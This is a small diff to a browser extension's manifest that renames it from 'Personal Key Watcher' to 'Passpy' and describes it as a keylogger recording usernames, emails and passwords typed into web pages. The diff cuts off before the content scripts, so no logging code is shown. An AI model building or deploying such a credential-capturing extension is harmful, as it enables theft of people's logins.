@@ -1,8 +1,8 @@
 {
   "manifest_version": 2,
-  "name": "Personal Key Watcher",
-  "short_name": "Personal Key Watcher",
-  "description": "Light weight key logger that logs text, email and password used in webpages into client database",
+  "name": "Passpy",
+  "short_name": "passpy",
+  "description": "Light weight key logger that logs usernames, emails and passwords (login credentials) used in webpages into client database",
   "version": "0.0.0.1",
   "content_scripts": [
     {
